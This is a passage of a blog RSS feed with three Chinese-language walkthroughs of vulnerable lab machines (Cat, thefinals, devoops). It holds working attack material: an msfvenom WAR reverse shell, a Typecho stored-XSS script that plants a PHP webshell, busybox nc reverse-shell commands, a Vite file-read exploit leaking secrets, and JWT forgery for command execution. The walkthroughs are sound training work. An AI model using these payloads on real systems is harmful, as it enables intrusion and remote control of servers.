sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_DC1.html</guid><pubDate>Sat, 30 Aug 2025 14:25:35 +0000</pubDate></item><item><title>内部_Cat</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Cat.html</link><description>### **一、信息收集**

首先，我们对目标网段进行主机发现，以确定目标机器的IP地址。

## 1. 主机发现

使用`arp-scan`工具扫描本地网络，寻找存活主机。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
...
192.168.205.149 08:00:27:5a:8c:5a       PCS Systemtechnik GmbH
...
```

从扫描结果中，我们识别出目标主机的IP地址为 `192.168.205.149`。

## 2. 端口扫描

确认目标IP后，使用`nmap`进行全端口扫描，以探测其开放的服务。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.149
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-23 05:40 EDT
Nmap scan report for 192.168.205.149
Host is up (0.00012s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
MAC Address: 08:00:27:5A:8C:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.23 seconds
```

扫描结果显示目标主机开放了三个端口：

*   **22/tcp**: SSH服务，用于远程登录。
*   **80/tcp**: HTTP服务，一个Web服务器。
*   **8080/tcp**: HTTP-Proxy服务，通常也是Web服务，可能是Tomcat或类似的Java应用服务器。

# **二、Web渗透**

我们从Web服务开始进行渗透。

## 1. 80端口 - Apache服务

访问 `http://192.168.205.149`，发现是一个纯静态的猫咪动画页面，没有可交互的功能点。因此，我们对其进行目录爆破，尝试发现隐藏的路径或文件。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ dirsearch -u http://192.168.205.149
...
[05:41:20] 200 -    0B  - /config.php
[05:41:21] 200 -    0B  - /database.php
[05:41:32] 200 -    0B  - /upload.php
[05:41:32] 301 -  320B  - /uploads  -&gt;  http://192.168.205.149/uploads/
[05:41:32] 200 -  408B  - /uploads/
...
```

目录爆破发现了一些有趣的PHP文件，如`config.php`、`database.php`和`upload.php`，但它们的大小都为0字节，表明是空文件。`/uploads/`目录虽然存在，但其中没有任何内容。80端口的渗透似乎陷入僵局。

## 2. 8080端口 - Tomcat服务

接着，我们访问 `http://192.168.205.149:8080`，页面显示这是`Tomcat/10.1.20`的管理界面。Tomcat的管理后台常常存在弱口令漏洞，我们尝试使用常见用户名和密码进行登录。

**弱口令尝试:**

*   `admin`
*   `manager`
*   `tomcat`
*   ...

最终，在访问 `http://192.168.205.149:8080/manager` 时，使用 `admin:tomcat` 成功登录到Tomcat Web应用程序管理器。

## 3. 获取WebShell

成功登录后台后，我们可以通过部署WAR文件来获取服务器的控制权。

首先，使用`msfvenom`生成一个Java的反向shell payload。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.205.128 LPORT=8888 -f war -o shell.war
Payload size: 1090 bytes
Final size of war file: 1090 bytes
Saved as: shell.war
```

接着，在Tomcat后台的 'WAR file to deploy' 处上传我们生成的`shell.war`文件并部署。

![image-20250823174407373](http://7r1UMPHK.github.io/image/20250825140722701.webp)

同时，在Kali上使用`netcat`开启监听。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888
```

部署成功后，点击新应用程序的路径（例如 `/shell`）来触发payload。

```shell
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.149] 43420
id
uid=1001(tomcat) gid=998(tomcat) groups=998(tomcat)
```

成功接收到反弹shell，当前用户为`tomcat`。

# **三、权限提升**

为了方便后续操作，我们首先对获取的非交互式shell进行稳定化处理。

```shell
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 36 columns 178
```

## 1. tomcat -&gt; catcatcat

在目标系统中进行信息搜集，寻找可利用的提权线索。通过查找近期被修改过的文件，发现了两个可疑的二进制文件。

```bash
/usr/local/bin/catcatcat      2025-08-02   -rwxr-xr-x        16808
/usr/bin/imgcat               2025-08-02   -rwxr-xr-x       642040
```

`imgcat` 是一个在终端显示图片的工具。我们重点关注`catcatcat`这个自定义命令。使用`strings`命令检查该文件，发现硬编码的密码字符串。

```shell
tomcat@Cat:/tmp$ strings /usr/local/bin/catcatcat
...
password:this_is_cat_passwd
...
```

接下来，查看`/etc/passwd`文件，寻找可能与此密码对应的用户。

```shell
tomcat@Cat:/tmp$ cat /etc/passwd|grep bash
root:x:0:0:root:/root:/bin/bash
catcatcat:x:1000:1000:,,,:/home/catcatcat:/bin/bash
dog:x:1002:1001:,,,:/home/dog:/bin/bash
```

发现存在一个名为`catcatcat`的用户。使用该用户名和找到的密码`this_is_cat_passwd`通过SSH进行登录。（su切换不了，只可以使用ssh）

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ssh catcatcat@192.168.205.149
catcatcat@192.168.205.149's password:
...
catcatcat@Cat:~$ id
uid=1000(catcatcat) gid=1000(catcatcat) groups=1000(catcatcat)
```

成功切换到`catcatcat`用户。

## 2. catcatcat -&gt; root

登录后，检查`catcatcat`用户的`sudo`权限。

```shell
catcatcat@Cat:~$ sudo -l
Matching Defaults entries for catcatcat on Cat:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User catcatcat may run the following commands on Cat:
    (ALL) NOPASSWD: /usr/bin/imgcat
```

结果表明，`catcatcat`用户可以免密码以root权限执行`/usr/bin/imgcat`命令。这通常是一个提权的突破口，但这里是一个兔子洞（最近Sublarge很喜欢出这种兔子洞啊）。

在`catcatcat`用户的主目录下，发现一个名为`cat.jpg`的图片文件。

```shell
catcatcat@Cat:~$ ls -al
...
-rw-r--r-- 1 catcatcat catcatcat 4460980 Aug  2 09:50 cat.jpg
-rw-r--r-- 1 catcatcat catcatcat      44 Aug  2 09:18 user.txt
...
```

我们将此图片文件通过`scp`传回Kali进行分析。

```shell
catcatcat@Cat:~$ scp cat.jpg kali@192.168.205.128:/mnt/hgfs/gx/x/tmp
...
cat.jpg                                       100% 4356KB  92.5MB/s   00:00
```

使用隐写术分析工具`stegseek`对图片进行分析，尝试提取隐藏信息。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ stegseek cat.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ''
[i] Original filename: 'id_rsa'.
[i] Extracting to 'cat.jpg.out'.
```

`stegseek`成功在无密码的情况下提取出了一个名为`id_rsa`的文件，这通常是SSH私钥。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ head -n 1 cat.jpg.out
-----BEGIN OPENSSH PRIVATE KEY-----
```

确认是私钥文件后，我们用它来尝试以root身份登录目标主机。

首先，赋予私钥正确的权限。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ mv cat.jpg.out /tmp/id_rsa
┌──(kali㉿kali)-[/tmp]
└─$ chmod 600 id_rsa
```

然后，使用该私钥通过SSH连接到目标。

```shell
┌──(kali㉿kali)-[/tmp]
└─$ ssh root@192.168.205.149 -i /tmp/id_rsa
...
Last login: Sat Aug 23 05:35:10 2025 from 192.168.205.128
root@Cat:~# id
uid=0(root) gid=0(root) groups=0(root)
```

成功获取root权限。

# **四、夺取Flag**

最后，在对应的目录下读取user和root的flag。

```shell
root@Cat:~# cat /root/root.txt /home/catcatcat/user.txt
flag{root-471e997ce8c23ad558c2935b88814ab3}
flag{user-081d683d33dde135a273b484ee70123b}
```

渗透测试完成。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Cat.html</guid><pubDate>Mon, 25 Aug 2025 06:06:56 +0000</pubDate></item><item><title>hmv_thefinals</title><link>https://7r1UMPHK.github.io/post/hmv_thefinals.html</link><description># 一、信息收集

## 1.1 主机发现与端口扫描

首先，使用 `arp-scan` 在本地网络中发现目标主机的 IP 地址。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l                         
...
192.168.205.157 08:00:27:19:f4:ef       PCS Systemtechnik GmbH
...
```

确定目标主机 IP 为 `192.168.205.157`。接着，使用 `nmap` 对其进行全端口扫描，以确定开放的服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.157
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:19:F4:EF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
...
```

扫描结果显示，目标主机开放了 22 (SSH) 和 80 (HTTP) 两个端口。

## 1.2 Web 服务探测

访问目标主机的 80 端口，发现是一个名为 'THE FINALS' 的静态网站，页面源码显示这是一个基于模板的网站，没有直接可利用的信息。

使用目录扫描工具 `dirsearch` 进一步探测 Web 服务的目录结构。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ dirsearch -u http://192.168.205.157
...
[10:46:28] 200 -   17KB - /blog/
[10:46:28] 200 -  820B  - /cgi-bin/printenv
[10:46:28] 200 -    1KB - /cgi-bin/test-cgi
...
```

扫描结果发现 `/cgi-bin/printenv` 和 `/cgi-bin/test-cgi` 两个 CGI 脚本，但访问后发现它们只是用于测试的示例脚本，并未执行，没有实际利用价值。

关键发现是 `/blog/` 目录。访问该目录 `http://192.168.205.157/blog/`，发现是一个 Typecho 博客系统。为了方便后续操作，将域名与 IP 绑定到本地 hosts 文件中。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ tail -n 1 /etc/hosts      
192.168.205.157 THEFINALS.hmv
```

通过页面信息和特征判断，该博客系统版本为 Typecho 1.2.0。

# 二、漏洞利用 (Typecho 1.2.0 存储型 XSS)

## 2.1 漏洞分析

查询公开漏洞库可知，Typecho 1.2.0 版本存在一个存储型 XSS 漏洞（参考 issue [#1546](https://github.com/typecho/typecho/issues/1546)。

*   **漏洞成因**：漏洞存在于文章的评论功能中。当用户提交评论时，其填写的个人网站 URL 字段在后端处理和前端渲染时没有进行充分的过滤和编码。
*   **触发原理**：攻击者可以将恶意 JavaScript 代码构造在 URL 字段中。例如，通过闭合前一个 `&lt;a&gt;` 标签并插入一个新的 `&lt;script&gt;` 标签，来注入恶意脚本。当网站管理员在后台管理评论页面（`manage-comments.php`）查看这条恶意评论时，这段 JavaScript 代码就会在管理员的浏览器中执行。
*   **利用思路**：利用这个 XSS 漏洞，我们可以构造一段 JavaScript payload，当管理员查看评论时，该 payload 会在后台自动执行一系列操作，例如修改主题文件（如 `404.php`）并写入一个 webshell，从而实现对服务器的控制。

## 2.2 构造并执行 Payload

根据漏洞原理，我们编写一段 JavaScript payload (`exp.js`)，其功能是：

1.  在管理员后台页面中，动态创建一个不可见的 iframe，加载主题文件 `404.php` 的编辑页面。
2.  在 iframe 加载完成后，通过 `onload` 事件触发 `writeShell()` 函数。
3.  `writeShell()` 函数会定位到 `404.php` 的文本编辑框，将 PHP 一句话木马 `&lt;?php system($_GET['a']); ?&gt;` 写入文件内容的顶部。
4.  最后，模拟点击“保存文件”按钮，将 webshell 写入到服务器。

```javascript
// exp.js
var isSaved = false;
var attemptCounter = 0;

function insertIframe() {
    var path = window.location.pathname;
    var adminBase = path.includes('manage-comments.php') 
        ? path.replace('manage-comments.php', '') 
        : '/admin/';
    var themeUrl = adminBase + 'theme-editor.php?theme=default&amp;file=404.php';

    var iframe = `&lt;iframe id='theme_id' src='${themeUrl}' width='0' height='0' onload='writeShell()'&gt;&lt;/iframe&gt;`;
    document.body.innerHTML += iframe;
}

function writeShell() {
    if (isSaved || attemptCounter &gt; 10) return;
    attemptCounter++;

    try {
        var iframeDoc = document.getElementById('theme_id').contentWindow.document;
        var content = iframeDoc.getElementById('content');
        var buttons = iframeDoc.getElementsByTagName('button');

        if (content &amp;&amp; buttons.length &gt; 1) {
            var val = content.value;
            var payload = '&lt;?php system($_GET['a']); ?&gt;\n';
            if (val.indexOf(payload) === -1) {
                content.value = payload + val;
                buttons[1].click();
                isSaved = true;
            }
        }
    } catch (e) {}

    if (!isSaved) {
        setTimeout(writeShell, 500); 
    }
}

insertIframe();
```

接着，在本地（Kali）开启一个 HTTP 服务来托管 `exp.js`。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

然后，在博客的文章评论区提交一条恶意评论，其中 'Website' 字段填入我们构造好的 XSS payload，用于加载远程的 `exp.js` 脚本。

```
http://a.com/'&gt;&lt;/a&gt;&lt;script/src='http://192.168.205.128/exp.js'&gt;&lt;/script&gt;&lt;a/href='#
```

当评论提交后，等待一段时间（模拟管理员查看评论），本地 HTTP 服务器会收到来自目标服务器的请求，说明 XSS 已成功触发。

```bash
...
192.168.205.1 - - [24/Aug/2025 10:53:08] 'GET /exp.js HTTP/1.1' 200 -
...
```

## 2.3 获取 Webshell 并反弹 Shell

XSS 触发后，webshell 已被写入 `/usr/themes/default/404.php`。我们可以通过访问该文件并传入命令来验证。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 'http://192.168.205.157/blog//usr/themes/default/404.php?a=id'         
uid=102(apache) gid=103(apache) groups=82(www-data),103(apache),103(apache)
```

命令成功执行。接下来，在 Kali 上设置 `netcat` 监听，并利用 webshell 执行反弹 shell 命令，获取一个交互式 Shell。

Kali 监听：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lnvp 8888
```

执行反弹 Shell：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 'http://192.168.205.157/blog//usr/themes/default/404.php?a=busybox%20nc%20192%2E168%2E205%2E128%208888%20%2De%20%2Fbin%2Fash'
```

成功获取到 `apache` 用户的 Shell，并升级为稳定的 TTY。

# 三、横向移动

## 3.1 信息搜集

在 `apache` 用户的 Shell 中，首先查看博客的配置文件，获取数据库凭据。

```bash
/var/www/html/blog $ cat config.inc.php
...
$db-&gt;addServer(array (
  'host' =&gt; 'localhost',
  'port' =&gt; 3306,
  'user' =&gt; 'typecho_u',
  'password' =&gt; 'QLTkbviW71CSRZtGWIQdB6s',
  'database' =&gt; 'typecho_db',
...
```

使用获取到的凭据连接数据库，并查询 `typecho_users` 表，找到了 `staff` 用户的密码哈希。尝试破解该哈希未果，判断为兔子洞。

```bash
/var/www/html/blog $ mysql -u typecho_u -pQLTkbviW71CSRZtGWIQdB6s typecho_db -e 'select * from typecho_users;'
...
|   1 | staff | $P$B/qMMS9FETOrEZ38X0YDY5gKJOyiwQ1 | ...
...
```

接着，检查 `/home` 目录，发现了 `june`, `scotty`, `staff` 三个用户。在 `/home/june` 目录下发现 `message.txt`，内容提到了 'BROADCAST' 和 'CNS'，这是一个重要线索。

通过 `find` 命令查找属于 `scotty` 用户的文件，发现了日志文件 `/var/log/scotty-main.log`。

```bash
/home/june $ head -n 10 /var/log/scotty-main.log
Broadcast to eth0 192.168.11.255:1337
...
```

日志显示，系统正在向 `192.168.11.255` 的 1337 端口进行 UDP 广播。

## 3.2 流量监听与凭据获取

根据日志文件的线索，在 Kali 上使用 `tcpdump` 监听来自目标主机的流量。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo tcpdump -A host 192.168.205.157
...
E..@..@.@. ............9.,V&lt;LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBMXduMDk0cGhPcXNmYm8rbzNDQllpTjN4QTE2eW1LU2JYMlVZMzJ4L0FFd0FBQUpnRGMvWVVBM1AyCkZBQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQTF3bjA5NHBoT3FzZmJvK28zQ0JZaU4zeEExNnltS1NiWDJVWTMyeC9BRXcKQUFBRUN2N2tmZW9YT1FDaTVDUklXZEhpRFQ1dXBLeVkzdlF4QWxLbXhFUXpSWkxEWENmVDNpbUU2cXg5dWo2amNJRmlJMwpmRURYcktZcEp0ZlpSamZiSDhBVEFBQUFFbkp2YjNSQWRHaGxabWx1WVd4ekxtaHRkZ0VDQXc9PQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K
```

捕获到了一段 Base64 编码的数据。对其进行解码，发现是一个 SSH 私钥。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ echo '...' | base64 -d &gt; /tmp/id_rsa
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ cat /tmp/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
```

保存私钥并赋予 `600` 权限。通过 `ssh-keygen` 查看其关联用户，发现是 `root@thefinals.hmv`。然而，尝试使用该私钥以 `root` 身份登录失败。进一步尝试以 `scotty` 用户身份登录，成功。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ chmod 600 /tmp/id_rsa
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ssh scotty@192.168.205.157 -i /tmp/id_rsa

thefinals:~$ id
uid=1002(scotty) gid=100(users) groups=100(users),100(users)
```

成功横向移动到 `scotty` 用户。

# 四、权限提升

## 4.1 Sudo 权限分析

以 `scotty` 用户身份登录后，立即检查 `sudo` 权限。

```bash
thefinals:~$ sudo -l
...
User scotty may run the following commands on thefinals:
    (ALL) NOPASSWD: /sbin/secret
```

`scotty` 用户可以无需密码以 `root` 权限执行 `/sbin/secret`。尝试直接运行该命令。

```bash
thefinals:~$ sudo /sbin/secret
/sbin/secret: line 2: can't create /dev/pts/99: Permission denied
```

程序执行失败，错误信息表明它尝试向 `/dev/pts/99` 这个伪终端（TTY）设备文件写入内容时权限不足。这揭示了提权的关键：我们需要让自己进入 `/dev/pts/99` 这个 TTY 会话。

## 4.2 TTY 占用与提权

系统分配 TTY 编号是顺序的。为了获得 `/dev/pts/99`，我们需要先创建并占用掉从 0 到 98 的所有 TTY。

由于目标系统上没有安装 `screen` 或 `tmux` 等工具，我们选择使用 `python` 的 `pty` 模块来生成新的 TTY 会话。

1. **批量创建后台 TTY**：
   编写一个 `while` 循环，在后台启动 9* 个新的 TTY 会话，以占用 `/dev/pts/0` 到 `/dev/pts/9*`（这里就到一个大概范围，然后查看tty自己微调到98就好了）。

   ```bash
   thefinals:~$ i=0; while [ $i -lt 95 ]; do python -c 'import pty; pty.spawn('/bin/ash')' &amp; i=$((i+1)); done
   ```

*ps:我这肯定是没到98的，自己查看tty进行调整*

1. **创建目标 TTY**：
   现在，再创建一个**前台**的 TTY 会话，这个会话将被分配到编号 `/dev/pts/98`。

   ```bash
   thefinals:~$ python -c 'import pty; pty.spawn('/bin/ash')'
   ~ $ tty
   /dev/pts/98
   ```

   (这里发现需要99个会话，不是98个，故再补上)

2. **获取凭据**：
   在 `/dev/pts/98` (实际为 `/dev/pts/99`，因为从0开始) 的 TTY 中，再次执行 `sudo` 命令。

   ```bash
   ~ $ sudo /sbin/secret
   root:p8RuoQGTtlKLAjuF1Tpy5wX
   ```

   这次命令成功执行，并输出了一对凭据。这看起来像是数据库的 root 用户密码。

## 4.3 获取最终 Root 权限

使用上一步获取的密码尝试连接本地 MySQL/MariaDB 服务。

```bash
~ $ mysql -u root -pp8RuoQGTtlKLAjuF1Tpy5wX secret -e 'select * from user;'
...
+----+----------+-------------------------+
| id | username | password                |
+----+----------+-------------------------+
|  1 | root     | BvIpFDyB4kNbkyqJGwMzLcK |
+----+----------+-------------------------+
```

在 `secret` 数据库的 `user` 表中，发现了 `root` 用户的密码 `BvIpFDyB4kNbkyqJGwMzLcK`。使用这个密码切换到 `root` 用户。

```bash
~ $ su -
Password: BvIpFDyB4kNbkyqJGwMzLcK
thefinals:~# id
uid=0(root) gid=0(root) groups=0(root),...
```

成功切换到 `root` 用户。最后，读取位于 `/root/root.flag` 和 `/home/june/user.flag` 的两个 flag 文件，完成挑战。

```bash
thefinals:~# cat /root/root.flag
flag{8c5daa407626d218e962041dd8fd8f37913e56e32a6f06725da403175be0b9ff}

thefinals:~# cat /home/june/user.flag
flag{4b5d61daf3e2e5ba57019f617012ad0919c2a6c29e11912aeadef2820be8f298}
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_thefinals.html</guid><pubDate>Sun, 24 Aug 2025 15:29:58 +0000</pubDate></item><item><title>hmv_devoops</title><link>https://7r1UMPHK.github.io/post/hmv_devoops.html</link><description># **一、信息收集**

首先，使用`arp-scan`工具对当前局域网进行扫描，以发现存活主机并确定靶机的IP地址。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l                               
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
...
192.168.205.149 08:00:27:df:47:90       PCS Systemtechnik GmbH
...
```

发现目标主机IP为 `192.168.205.149`。

接着，使用`nmap`对目标主机进行全端口扫描，以探测其开放的服务。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.149
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 07:29 EDT
Nmap scan report for 192.168.205.149
Host is up (0.00020s latency).
Not shown: 65535 closed tcp ports (reset)
PORT     STATE SERVICE
3000/tcp open  ppp
MAC Address: 08:00:27:DF:47:90 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.43 seconds
```

扫描结果显示，目标主机仅开放了 3000 端口。

使用`curl`访问该端口提供的Web服务，查看页面源代码。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.149:3000                                                               
&lt;!doctype html&gt;
&lt;html lang='en'&gt;
  &lt;head&gt;
    &lt;script type='module' src='/@vite/client'&gt;&lt;/script&gt;
...
    &lt;title&gt;Vite + Vue&lt;/title&gt;
...
    &lt;script type='module' src='/src/main.js'&gt;&lt;/script&gt;
...
&lt;/html&gt;
```

从返回的HTML内容可以判断，这是一个基于 Vite 和 Vue 构建的前端项目。Vite 是一个现代化的前端构建工具，其在开发模式下会提供一个开发服务器。

# **二、漏洞发现与利用**

尝试读取该Vite项目的配置文件`vite.config.js`，以了解其后端代理和安全设置。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.149:3000/vite.config.js 
import { defineConfig } from '/node_modules/.vite/deps/vite.js?v=4e07dcb1'
...
export default defineConfig({
  plugins: [vue()],
  server: {
    proxy: {
      '/sign': {
        target: 'http://localhost:3001',
        changeOrigin: true,
        rewrite: (path) =&gt; path.replace(/^\/sign/, '/api/sign')
      },
      '/execute': {
        target: 'http://localhost:3001',
        changeOrigin: true,
        rewrite: (path) =&gt; path.replace(/^\/execute/, '/api/execute')
      }
    },
    fs: {
      deny: ['.env', '.env.*', '*.{crt,pem}', '**/.git/**', 'package.json'],
    }
  },
})
```

配置文件暴露了两个API代理路径 `/sign` 和 `/execute`，它们都被转发到本地的 `http://localhost:3001` 服务。同时，`fs.deny` 配置项试图阻止对 `.env` 等敏感文件的直接访问。

继续读取后端服务的主逻辑文件 `server.js`。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.149:3000/server.js
...
app.get('/api/sign', (req, res) =&gt; {
    return res.json({
        'status': 'signed',
        'data': jwt.sign({
            uid: -1,
            role: 'guest',
        }, process.env.JWT_SECRET, { expiresIn: '1800s' }),
    });
});

app.get('/api/execute', async (req, res) =&gt; {
...
    try {
        const payload = jwt.verify(jwt_raw, process.env.JWT_SECRET);
        if (payload.role !== 'admin') {
...
    const command = req.query.cmd;

    const is_command_safe = is_safe_command(command);
...
});
...
```

代码审计发现：

1.  `/api/sign` 接口使用 `process.env.JWT_SECRET` 作为密钥，签发一个角色为 `guest` 的JWT。
2.  `/api/execute` 接口要求请求头中包含有效的JWT，并验证其 `role` 是否为 `admin`，之后会执行 `cmd` 参数传入的命令。

尽管 `vite.config.js` 中配置了 `fs.deny`，但 Vite 在某些版本中存在目录遍历和文件读取漏洞（此靶机环境中为**CVE-2025-30208**），可以绕过该限制。通过特定payload可以读取到 `.env` 文件内容。

&gt; [!Tip]
&gt;
&gt; https://github.com/ThumpBo/CVE-2025-30208-EXP

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -s 'http://192.168.205.149:3000/opt/node/.env?import&amp;raw??'
export default 'JWT_SECRET='2942szKG7Ev83aDviugAa6rFpKixZzZz'\nCOMMAND_FILTER='nc,python,python3,py,py3,bash,sh,ash,|,&amp;,&lt;,&gt;,ls,cat,pwd,head,tail,grep,xxd'\n'
```

成功获取到 `JWT_SECRET`：`2942szKG7Ev83aDviugAa6rFpKixZzZz`，以及命令执行的黑名单 `COMMAND_FILTER`。

利用获取到的 `JWT_SECRET`，我们可以伪造一个角色为 `admin` 的JWT。可以访问 [[jwt.cagdastunca.com](https://jwt.cagdastunca.com/)](https://jwt.cagdastunca.com/) 或其他JWT工具来完成此操作。

**伪造的Payload:**

```json
{
  'uid': -1,
  'role': 'admin',
  'iat': 1756035331,
  'exp': 1756037131
}
```

**生成的Admin Token:**
`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NTYwMzUzMzEsImV4cCI6MTc1NjAzNzEzMX0.meJBbQUW_wJiQBM7FBtF6IIdP0SJrD5Z_tXJoRr6yi0`

使用伪造的Token尝试执行 `id` 命令，验证远程代码执行（RCE）是否成功。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ADMIN_TOKEN='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NTYwMzUzMzEsImV4cCI6MTc1NjAzNzEzMX0.meJBbQUW_wJiQBM7FBtF6IIdP0SJrD5Z_tXJoRr6yi0'
      
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -g -H 'Authorization: Bearer $ADMIN_TOKEN' 'http://192.168.205.149:3000/execute?cmd=id'
{'status':'executed','data':{'stdout':'uid=1000(runner) gid=1000(runner) groups=1000(runner)\n','stderr':''}}
```

命令成功执行，当前用户为 `runner`。

# **三、获取反弹Shell**

为了获得一个交互式的Shell，我们准备进行反弹Shell操作。通过执行 `busybox` 命令，可以查看目标系统支持的工具。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -g -H 'Authorization: Bearer $ADMIN_TOKEN' 'http://192.168.205.149:3000/execute?cmd=busybox'
{'status':'executed','data':{'stdout':'BusyBox v1.37.0 ... \n ... \n\t ... nc, netstat, ... wget, ...\n ...','stderr':''}}
```

目标系统存在 `busybox nc` 和 `wget`，且均未被`COMMAND_FILTER`过滤。可以利用这些工具来获取反弹Shell。

1. 在本地Kali攻击机上创建一个包含反弹Shell命令的脚本 `sss`。

   ```shell
   ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
   └─$ cat sss
   busybox nc 192.168.205.128 8888 -e /bin/ash
   ```

2. 在Kali上开启一个临时的HTTP服务，用于靶机下载脚本。

   ```shell
   ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
   └─$ python3 -m http.server 80
   Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
   ```

3. 在Kali上使用 `nc` 监听8888端口，准备接收反弹Shell。

   ```shell
   ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
   └─$ nc -lvnp 8888
   ```

4. 通过RCE漏洞，执行一串命令：下载脚本(`wget`)，赋予执行权限(`chmod`)，然后执行脚本。

   ```shell
   ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
   └─$ curl -g -H 'Authorization: Bearer $ADMIN_TOKEN' 'http://192.168.205.149:3000/execute?cmd=wget%20192%2E168%2E205%2E128%2Fsss%0Achmod%20%2Bx%20%2E%2Fsss%0A%2E%2Fsss'
   ```

成功接收到反弹Shell。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888                     
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.149] 45275
id
uid=1000(runner) gid=1000(runner) groups=1000(runner)
```

# **四、横向移动**

在获得的Shell中进行信息收集，发现 `/opt` 目录下存在一个 `gitea` 目录，其中包含一个名为 `node.git` 的git仓库。

```shell
...
cd /opt/gitea/git/hana
ls -al
total 12
drwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:22 .
drwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:22 ..
drwxr-xr-x    8 gitea    www-data      4096 Apr 21 14:36 node.git
```

为了深入分析，我们将整个 `node.git` 仓库打包并传回Kali攻击机。

1. 在靶机上，将 `node.git` 目录打包。

   ```shell
   busybox tar -cf /tmp/1.tar node.git
   ```

2. 在Kali上监听1234端口，并将接收到的数据保存为 `1.tar`。

